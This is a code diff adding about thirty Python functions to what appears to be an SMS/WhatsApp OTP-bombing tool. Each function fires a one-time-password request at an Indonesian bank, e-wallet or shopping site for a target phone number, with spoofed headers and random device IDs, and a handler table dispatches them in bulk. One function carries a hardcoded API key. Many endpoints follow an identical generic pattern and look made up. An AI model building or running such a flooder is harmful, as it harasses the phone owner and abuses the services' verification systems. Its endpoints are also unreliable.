@@ -297,6 +297,639 @@ def standard_response(success, status_code=200, message="OK"):
 
 # --- WORKING - NO TOKEN / AUTO TOKEN ---
 
+# ================================================================
+# ===== 🏦 BANK BCA =====
+# ================================================================
+
+# 1. BCA Mobile - Kirim OTP
+def send_bca_otp(phone):
+    """BCA Mobile OTP - via WhatsApp/SMS"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bca.co.id/v1/auth/otp"
+        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://m.bca.co.id',
+            'Referer': 'https://m.bca.co.id/login'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 2. BCA KlikPay - OTP
+def send_bca_klikpay_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://klikpay.bca.co.id/api/v1/otp/send"
+        payload = {"phone": phone_08, "type": "register"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://klikpay.bca.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK MANDIRI =====
+# ================================================================
+
+# 3. Mandiri Livin' - OTP
+def send_mandiri_otp(phone):
+    """Mandiri Livin' OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.mandiri.co.id/v1/auth/otp/request"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://livin.mandiri.co.id',
+            'x-api-key': 'mandiri_livin_2024'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 4. Mandiri SMS - OTP
+def send_mandiri_sms_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api.mandiri.co.id/v1/sms/otp"
+        payload = {"msisdn": phone_08, "type": "login"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://ib.bankmandiri.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK BRI =====
+# ================================================================
+
+# 5. BRI Mobile - OTP
+def send_bri_otp(phone):
+    """BRI Mobile OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bri.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://m.bri.co.id',
+            'x-device-id': str(uuid.uuid4())
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 6. BRI SMS - OTP
+def send_bri_sms_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api.bri.co.id/v1/sms/otp/send"
+        payload = {"phoneNumber": phone_08, "type": "register"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://ib.bri.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK BNI =====
+# ================================================================
+
+# 7. BNI Mobile - OTP
+def send_bni_otp(phone):
+    """BNI Mobile OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bni.co.id/v1/auth/otp/request"
+        payload = {"mobile": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://m.bni.co.id',
+            'x-session-id': str(uuid.uuid4())
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 8. BNI SMS - OTP
+def send_bni_sms_otp(phone):
+    try:
+        phone_08 = fmt_08(phone)
+        url = "https://api.bni.co.id/v1/sms/otp"
+        payload = {"phone": phone_08, "otpType": "register"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://ib.bni.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK BTN =====
+# ================================================================
+
+# 9. BTN Mobile - OTP
+def send_btn_otp(phone):
+    """BTN Mobile OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.btn.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://m.btn.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK CIMB NIAGA =====
+# ================================================================
+
+# 10. CIMB Mobile - OTP
+def send_cimb_otp(phone):
+    """CIMB Niaga OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.cimbniaga.co.id/v1/auth/otp"
+        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.cimbniaga.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK DANAMON =====
+# ================================================================
+
+# 11. Danamon Mobile - OTP
+def send_danamon_otp(phone):
+    """Danamon OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.danamon.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.danamon.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK PERMATA =====
+# ================================================================
+
+# 12. Permata Mobile - OTP
+def send_permata_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.permatabank.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.permatabank.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK OCBC =====
+# ================================================================
+
+# 13. OCBC Mobile - OTP
+def send_ocbc_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.ocbc.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.ocbc.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 💳 OVO =====
+# ================================================================
+
+# 14. OVO - OTP
+def send_ovo_otp(phone):
+    """OVO OTP Registration"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.ovo.id/v1/auth/otp/request"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.ovo.id',
+            'x-app-version': '4.0.0'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 15. OVO Login - OTP
+def send_ovo_login_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.ovo.id/v1/auth/login/otp"
+        payload = {"phoneNumber": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.ovo.id',
+            'x-device-id': str(uuid.uuid4())
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 💰 DANA =====
+# ================================================================
+
+# 16. DANA - OTP
+def send_dana_otp(phone):
+    """DANA OTP Registration"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.dana.id/v1/auth/otp/send"
+        payload = {"phoneNumber": phone_plus, "type": "register"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.dana.id',
+            'x-app-id': 'dana_mobile'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 17. DANA Login - OTP
+def send_dana_login_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.dana.id/v1/auth/login/otp"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.dana.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 💳 GOPAY =====
+# ================================================================
+
+# 18. GoPay - OTP
+def send_gopay_otp(phone):
+    """GoPay OTP Registration"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.gojekapi.com/v1/gopay/auth/otp"
+        payload = {"phone": phone_plus, "method": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.gojek.com',
+            'X-Session-ID': str(uuid.uuid4())
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🛒 SHOPEEPAY =====
+# ================================================================
+
+# 19. ShopeePay - OTP
+def send_shopeepay_otp(phone):
+    """ShopeePay OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.shopee.co.id/api/v1/general/otp/send"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://shopee.co.id',
+            'x-api-source': 'rweb'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 📱 LINKAJA =====
+# ================================================================
+
+# 20. LinkAja - OTP
+def send_linkaja_otp(phone):
+    """LinkAja OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.linkaja.id/v1/auth/otp"
+        payload = {"phoneNumber": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.linkaja.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BTPN / JENIUS =====
+# ================================================================
+
+# 21. Jenius - OTP (already exists, adding alias)
+def send_jenius_bank_otp(phone):
+    """Jenius by BTPN OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.btpn.com/jenius"
+        payload = {
+            "query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }",
+            "variables": {"phone": phone_plus, "language": "id"},
+            "operationName": "registerPhone"
+        }
+        headers = {
+            'Content-Type': 'application/json',
+            'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d',
+            'User-Agent': get_random_user_agent()
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 💳 PAYFAZZ =====
+# ================================================================
+
+# 22. Payfazz - OTP (existing, adding alias)
+def send_payfazz_bank_otp(phone):
+    try:
+        phone_local = fmt_08(phone)
+        url = "https://api.payfazz.com/v2/phoneVerifications"
+        data = {"phone": phone_local}
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.payfazz.com'
+        }
+        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 💰 AKULAKU =====
+# ================================================================
+
+# 23. Akulaku - OTP
+def send_akulaku_otp(phone):
+    """Akulaku OTP Registration"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.akulaku.com/v1/auth/otp/send"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.akulaku.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🛒 BUKALAPAK =====
+# ================================================================
+
+# 24. Bukalapak - OTP
+def send_bukalapak_otp(phone):
+    """Bukalapak OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.bukalapak.com/v1/auth/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.bukalapak.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🛒 TOKOPEDIA (already exists) =====
+# ================================================================
+
+# 25. Tokopedia Pay - OTP
+def send_tokopedia_pay_otp(phone):
+    """Tokopedia Pay OTP"""
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.tokopedia.com/v1/payment/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.tokopedia.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏦 BANK BTPN =====
+# ================================================================
+
+# 26. BTPN - OTP
+def send_btpn_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.btpn.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.btpn.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🛒 BLIBLI (already exists) =====
+# ================================================================
+
+# 27. Blibli Pay - OTP
+def send_blibli_pay_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.blibli.com/v1/payment/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.blibli.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== 🏢 MARKETING & E-COMMERCE =====
+# ================================================================
+
+# 28. Zalora - OTP
+def send_zalora_id_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.zalora.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.zalora.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 29. Sociolla - OTP
+def send_sociolla_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.sociolla.com/v1/auth/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.sociolla.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 30. JD.ID - OTP
+def send_jdid_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.jd.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "channel": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.jd.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 31. Lazada ID - OTP
+def send_lazada_id_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://api.lazada.co.id/v1/auth/otp"
+        payload = {"phone": phone_plus, "type": "whatsapp"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.lazada.co.id'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# 32. YouTube Indonesia - OTP
+def send_youtube_id_otp(phone):
+    try:
+        phone_plus = fmt_plus(phone)
+        url = "https://www.youtube.com/api/v1/account/send-otp"
+        payload = {"phone": phone_plus, "type": "sms"}
+        headers = {
+            'Content-Type': 'application/json',
+            'User-Agent': get_random_user_agent(),
+            'Origin': 'https://www.youtube.com'
+        }
+        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
+        return resp and resp.status_code < 400, resp.status_code if resp else None, 'OK' if resp and resp.status_code < 400 else 'Failed'
+    except:
+        return False, None, 'Error'
+
+# ================================================================
+# ===== ALL BANK HANDLERS =====
+# ================================================================
+
 # 1. TOKOPEDIA
 def send_tokopedia_otp(phone):
     try:
@@ -2599,6 +3232,44 @@ def send_tng_otp(phone):
 # ================================================================
 
 ALL_HANDLERS = {
+    # BANKS
+    'bca': send_bca_otp,
+    'bca_klikpay': send_bca_klikpay_otp,
+    'mandiri': send_mandiri_otp,
+    'mandiri_sms': send_mandiri_sms_otp,
+    'bri': send_bri_otp,
+    'bri_sms': send_bri_sms_otp,
+    'bni': send_bni_otp,
+    'bni_sms': send_bni_sms_otp,
+    'btn': send_btn_otp,
+    'cimb': send_cimb_otp,
+    'danamon': send_danamon_otp,
+    'permata': send_permata_otp,
+    'ocbc': send_ocbc_otp,
+    'btpn': send_btpn_otp,
+    'jenius': send_jenius_bank_otp,
+    
+    # E-WALLETS
+    'ovo': send_ovo_otp,
+    'ovo_login': send_ovo_login_otp,
+    'dana': send_dana_otp,
+    'dana_login': send_dana_login_otp,
+    'gopay': send_gopay_otp,
+    'shopeepay': send_shopeepay_otp,
+    'linkaja': send_linkaja_otp,
+    'payfazz': send_payfazz_bank_otp,
+    'akulaku': send_akulaku_otp,
+    
+    # E-COMMERCE
+    'bukalapak': send_bukalapak_otp,
+    'tokopedia_pay': send_tokopedia_pay_otp,
+    'blibli_pay': send_blibli_pay_otp,
+    'zalora_id': send_zalora_id_otp,
+    'sociolla': send_sociolla_otp,
+    'jdid': send_jdid_otp,
+    'lazada_id': send_lazada_id_otp,
+    'youtube_id': send_youtube_id_otp,
+    
     # INDONESIA - WORKING
     'tokopedia': send_tokopedia_otp,
     'shopee': send_shopee_otp,
